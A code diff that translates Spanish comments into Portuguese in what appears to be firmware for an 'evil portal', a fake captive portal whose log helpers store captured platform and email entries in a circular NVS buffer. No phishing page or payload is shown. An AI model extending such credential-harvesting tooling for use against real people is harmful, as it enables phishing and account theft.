@@ -4,8 +4,8 @@
 static const char* NVS_NAMESPACE = "evilportal";
 static const char* NVS_COUNT_KEY = "log_count";
 
-// Cada log se guarda en NVS con clave "logN" donde N es el índice (0..MAX_LOGS-1)
-// El count es circular: siempre es el último escrito
+// Cada log é salvo no NVS com a chave "logN" onde N é o índice (0..MAX_LOGS-1)
+// O count é circular: é sempre o último escrito
 
 // ═══════════════════════════════════════════════════════════════════════════
 //  HELPERS
@@ -46,7 +46,7 @@ bool portalLogAdd(const String& platform, const String& email,
     int count = getStoredCount();
     if (count < 0) count = 0;
 
-    // Si ya llegamos al máximo, rotamos (sobrescribimos la más vieja)
+    // Se já chegamos ao máximo, rotacionamos (sobrescrevemos a mais antiga)
     int writeIdx;
     if (count < MAX_LOGS) {
         writeIdx = count;
@@ -85,9 +85,9 @@ bool portalLogGet(int idx, PortalLog& out) {
     int count = getStoredCount();
     if (count <= 0) return false;
 
-    // idx 0 = más reciente
-    // Si count <= MAX_LOGS, el orden es simple: writeIdx = count - 1 - idx
-    // Si count > MAX_LOGS, hay que calcular posición circular
+    // idx 0 = mais recente
+    // Se count <= MAX_LOGS, a ordem é simples: writeIdx = count - 1 - idx
+    // Se count > MAX_LOGS, é preciso calcular a posição circular
 
     int actualCount = count > MAX_LOGS ? MAX_LOGS : count;
     if (idx < 0 || idx >= actualCount) return false;
@@ -96,7 +96,7 @@ bool portalLogGet(int idx, PortalLog& out) {
     if (count <= MAX_LOGS) {
         physIdx = count - 1 - idx;
     } else {
-        // Escritura circular: la última posición escrita fue (count-1) % MAX_LOGS
+        // Escrita circular: a última posição escrita foi (count-1) % MAX_LOGS
         int lastWrite = (count - 1) % MAX_LOGS;
         physIdx = (lastWrite - idx + MAX_LOGS) % MAX_LOGS;
     }
